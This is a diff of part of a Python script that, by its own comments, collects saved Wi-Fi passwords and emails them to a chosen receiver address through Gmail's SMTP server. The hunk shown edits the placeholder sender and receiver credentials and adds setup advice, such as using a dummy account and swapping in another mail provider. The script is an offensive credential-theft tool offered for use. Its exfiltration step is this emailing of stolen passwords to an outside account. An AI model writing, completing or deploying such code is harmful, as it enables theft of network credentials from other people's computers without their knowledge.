@@ -56,12 +56,12 @@ for x in cmd:
 
 ################################# email sender ########################################################
 
-my_gmail = "YOUR EMAIL ADDRESS" # this email address will be used to send wifi passwords
-my_pswd = "YOUR EMAIL PASS" # WARNING: DON'T USE YOUR MAIN EMAIL USE A DUMMY EMAIL INSTEAD
+my_gmail = "YourEmailAddress@gmail.com" # this email address will be used to send wifi passwords
+my_pswd = "YourEmailPassword" # WARNING: DON'T USE YOUR MAIN EMAIL USE A DUMMY EMAIL INSTEAD
 
-reciever = "RECIEVER EMAIL ADDRESS" # THIS EMAIL ADDRESS WILL RECIEVE THE WIFI PASSWORDS
+reciever = "ReceverEmailAddress@gmail.com" # THIS EMAIL ADDRESS WILL RECIEVE THE WIFI PASSWORDS
 
-smtp_server = smtplib.SMTP('smtp.gmail.com', 587)
+smtp_server = smtplib.SMTP('smtp.gmail.com', 587) # replacce "smtp.gmail.com" with you email service provider 
 smtp_server.ehlo()
 smtp_server.starttls()
 smtp_server.ehlo()
